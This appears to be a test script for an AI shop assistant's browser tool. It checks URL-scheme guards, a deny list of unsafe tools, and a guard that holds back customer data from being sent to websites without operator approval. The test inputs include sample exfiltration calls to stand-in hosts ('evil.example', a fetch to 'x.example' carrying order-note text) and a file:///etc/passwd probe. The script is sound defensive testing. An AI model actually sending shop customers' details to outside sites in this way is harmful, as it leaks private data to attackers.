/**
 * Abby's browser: the guards, then the real thing.
 *
 * Unit (no browser): the checked-in schema snapshot matches the installed
 * @playwright/mcp, only web addresses open, shop data cannot be sent to a site
 * without a yes, and old pages fold out of the transcript.
 *
 * Live (a Chromium with CDP on BROWSER_CDP_URL, started by
 * scripts/browser-local.sh if it is not up): open a page, read it, click by
 * ref, the live view gets frames and follows navigation, the operator's input
 * drives the page, the one-thread lock holds, and a browser that went away is
 * started again on the next call.
 *
 *   npx tsx scripts/test-agent-browser.ts
 */
process.env.AGENT_BROWSER = 'on';
process.env.BROWSER_START_CMD ||= 'sh scripts/browser-local.sh start';
process.env.BROWSER_STOP_CMD ||= 'sh scripts/browser-local.sh stop';

const { BROWSER_SCHEMAS } = await import('../src/modules/ai-agent/tools/browser.schemas.js');
const { liveBrowserSchemas } = await import('./browser-tool-schemas.js');
const { exfiltrationReason, outbound, WEB_MARK } = await import('../src/modules/ai-agent/tools/browser.tools.js');
const { collapseOldPages } = await import('../src/modules/ai-agent/core/run.js');
const browser = await import('../src/modules/ai-agent/core/browser.js');
const { getTool, toolsFor } = await import('../src/modules/ai-agent/registry.js');

let pass = 0;
let fail = 0;
function check(name: string, ok: boolean, detail = '') {
  if (ok) pass++;
  else fail++;
  console.log(`${ok ? '  ok ' : 'FAIL '} ${name}${!ok && detail ? ` — ${detail}` : ''}`);
}
const throws = (fn: () => unknown) => {
  try {
    fn();
    return false;
  } catch {
    return true;
  }
};

console.log('— unit');
{
  const live = await liveBrowserSchemas();
  check('schema snapshot matches the installed @playwright/mcp', JSON.stringify(live) === JSON.stringify(BROWSER_SCHEMAS), 'run: npx tsx scripts/browser-tool-schemas.ts');
  check('no tool that runs code in the API or reads its disk', !BROWSER_SCHEMAS.some((s) => ['browser_run_code_unsafe', 'browser_file_upload', 'browser_drop', 'browser_pdf_save'].includes(s.name)));
  const nav = getTool('browser_navigate');
  check('browser tools are registered, read tier, web', !!nav && !nav.write && !nav.destructive && !!nav.web);
  check('no browser tool exposes filename', BROWSER_SCHEMAS.every((s) => !getTool(s.name)?.input_schema.properties?.filename));
  check('read-only operators still get the browser (it changes nothing in the shop)', toolsFor(false).some((t) => t.name === 'browser_snapshot'));

  check('webUrl adds https to a bare host', browser.webUrl('example.com') === 'https://example.com/');
  check('webUrl refuses file://', throws(() => browser.webUrl('file:///etc/passwd')));
  check('webUrl refuses chrome://', throws(() => browser.webUrl('chrome://settings')));
  check('webUrl refuses javascript:', throws(() => browser.webUrl('javascript:alert(1)')));

  const order = JSON.stringify({ ref: 'ASC2610/0042', customer: { name: 'Nurul Aina', phone: '+60 12-345 6789', email: 'nurul.aina@example.com' }, note: 'Please leave the parcel with the guard at Blok C, Jalan Ampang' });
  const ctx = (said: string[], shop: string[] = [order]) => ({ turn: { untrusted: () => shop, trusted: () => said, shop: () => shop, webSeen: () => true } }) as any;
  check('phone from an order → parks', !!exfiltrationReason(ctx(['look her up']), 'browser_navigate', { url: 'https://evil.example/?p=60123456789' }));
  check('email from an order → parks', !!exfiltrationReason(ctx(['find her']), 'browser_type', { target: 'e1', text: 'nurul.aina@example.com' }));
  check('order number → parks', !!exfiltrationReason(ctx(['check it']), 'browser_fill_form', { fields: [{ target: 'e2', name: 'q', type: 'textbox', value: 'asc2610/0042' }] }));
  check('a sentence lifted from an order note → parks', !!exfiltrationReason(ctx(['go']), 'browser_evaluate', { function: '() => fetch("https://x.example/" + "leave the parcel with the guard at Blok C")' }));
  check('the same phone, typed by the operator → runs', exfiltrationReason(ctx(['search 60123456789 on truecaller']), 'browser_type', { target: 'e1', text: '60123456789' }) === null);
  check('an ordinary search → runs', exfiltrationReason(ctx(['what does BPC-157 cost elsewhere']), 'browser_navigate', { url: 'https://www.google.com/search?q=BPC-157+price+malaysia' }) === null);
  check('text from another web page (not shop data) → runs', exfiltrationReason(ctx(['compare'], []), 'browser_type', { target: 'e1', text: 'nurul.aina@example.com' }) === null);
  check('clicks send nothing', outbound('browser_click', { target: 'e3' }).length === 0);

  const page = (n: number) => ({ role: 'tool' as const, tool_call_id: `c${n}`, content: `{"source":"${WEB_MARK} …","page":"- Page URL: https://site${n}.example/\\n- Page Title: Site ${n}\\n${'x'.repeat(3000)}"}` });
  const msgs = [page(1), page(2), page(3)];
  collapseOldPages(msgs);
  check('older pages fold to a one-line stub', msgs[0].content!.startsWith('[an earlier web page — https://site1.example/'), msgs[0].content!.slice(0, 120));
  check('the last two pages stay whole', msgs[1].content!.length > 3000 && msgs[2].content!.length > 3000);
}

console.log('— live');
const A = 'test-thread-a';
const B = 'test-thread-b';
const text = (r: { content: { text?: string }[] }) => r.content.map((c) => c.text ?? '').join('\n');
try {
  const frames: { width: number }[] = [];
  const states: any[] = [];
  const unwatch = browser.watchBrowser((e) => (e.type === 'frame' ? frames.push(e) : states.push(e.state)));

  const r1 = await browser.callBrowser(A, 'browser_navigate', { url: 'https://example.com' });
  check('navigate opens the page', /Example Domain/.test(text(r1)) && /- Page URL: https:\/\/example\.com/.test(text(r1)), text(r1).slice(0, 300));

  const snap = text(await browser.callBrowser(A, 'browser_snapshot', {}));
  const ref = snap.match(/link "(?:Learn more|More information)[^"]*" \[ref=(e\d+)\]/)?.[1];
  check('snapshot carries element refs', !!ref, snap.slice(0, 400));
  if (ref) {
    const r2 = await browser.callBrowser(A, 'browser_click', { element: 'Learn more link', target: ref });
    check('click by ref follows the link', /iana\.org/.test(text(r2)), text(r2).slice(0, 300));
  }

  const shot = await browser.callBrowser(A, 'browser_take_screenshot', { type: 'png' });
  check('screenshot comes back as an image', shot.content.some((c) => c.type === 'image' && (c.data?.length ?? 0) > 1000));

  await new Promise((r) => setTimeout(r, 1500));
  check('the live view receives frames', frames.length > 0 && frames[0].width > 0, `${frames.length} frames`);
  const last = states.at(-1);
  check('the live view follows the tab Abby is on', !!last?.tabs?.some((t: any) => t.current && /iana\.org/.test(t.url)), JSON.stringify(last?.tabs));

  await browser.viewerInput({ type: 'navigate', url: 'example.org' });
  const after = await browser.browserStateFull();
  check("the operator's address bar drives the page", after.tabs.some((t) => t.current && /example\.org/.test(t.url)), JSON.stringify(after.tabs));
  const before = frames.length;
  await browser.viewerInput({ type: 'wheel', x: 0.5, y: 0.5, dx: 0, dy: 400 });
  await browser.viewerInput({ type: 'click', x: 0.5, y: 0.5 });
  check('operator input is accepted', true);
  await new Promise((r) => setTimeout(r, 800));
  check('frames keep coming while watched', frames.length >= before);
  check("the operator can't open file://", await browser.viewerInput({ type: 'navigate', url: 'file:///etc/hosts' }).then(() => false, () => true));

  check('a second conversation is refused while the first holds it', await browser.callBrowser(B, 'browser_snapshot', {}).then(() => false, (e) => /busy/.test(e.message)));

  unwatch();
  await browser.stopBrowser();
  check('stopped means stopped', !browser.browserState().running);
  const r3 = await browser.callBrowser(A, 'browser_navigate', { url: 'https://example.com' });
  check('the next call starts it again', /Example Domain/.test(text(r3)) && browser.browserState().running);
  await browser.stopBrowser();
} catch (err: any) {
  check('live run', false, err?.stack ?? String(err));
}

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
